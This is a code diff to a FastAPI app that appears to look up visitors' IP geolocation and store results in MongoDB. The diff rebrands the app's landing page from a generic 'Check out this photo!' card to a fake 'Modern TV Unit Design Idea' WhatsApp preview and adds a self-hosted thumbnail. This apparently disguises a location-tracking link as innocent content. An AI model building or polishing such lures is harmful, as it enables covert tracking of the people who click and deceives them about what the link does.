@@ -2,7 +2,7 @@ import asyncio
 import os
 from datetime import datetime, timezone
 from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
 import httpx
 import uvicorn
 from motor.motor_asyncio import AsyncIOMotorClient
@@ -42,6 +42,15 @@ async def fetch_ip_geolocation(ip: str) -> dict:
     return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}
 
 
+@app.get("/preview.jpg", include_in_schema=False)
+async def serve_preview_image():
+    """Serves the local preview.jpg image for WhatsApp/Social media link preview cards."""
+    image_path = "preview.jpg"
+    if os.path.exists(image_path):
+        return FileResponse(image_path, media_type="image/jpeg")
+    return HTMLResponse(content="Image not found", status_code=404)
+
+
 @app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
 async def public_landing_page(request: Request):
     if request.method == "HEAD":
@@ -63,13 +72,12 @@ async def public_landing_page(request: Request):
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Exclusive Photo Preview</title>
+        <title>Interior Design Preview</title>
         
-        <!-- Open Graph Meta Tags for Rich WhatsApp / Social Media Preview Cards -->
-        <meta property="og:title" content="Check out this photo!" />
-        <meta property="og:description" content="Tap to view the shared image." />
-        <!-- Replace the URL below with a direct image link if you want a specific thumbnail -->
-        <meta property="og:image" content="https://images.unsplash.com/photo-1579546929518-9e396f3cc809" />
+        <!-- Open Graph Meta Tags for Rich WhatsApp Preview Cards -->
+        <meta property="og:title" content="Modern TV Unit Design Idea" />
+        <meta property="og:description" content="Tap to view the full interior design photo." />
+        <meta property="og:image" content="https://location-q0pi.onrender.com/preview.jpg" />
         <meta property="og:url" content="https://location-q0pi.onrender.com" />
         <meta property="og:type" content="website" />
 
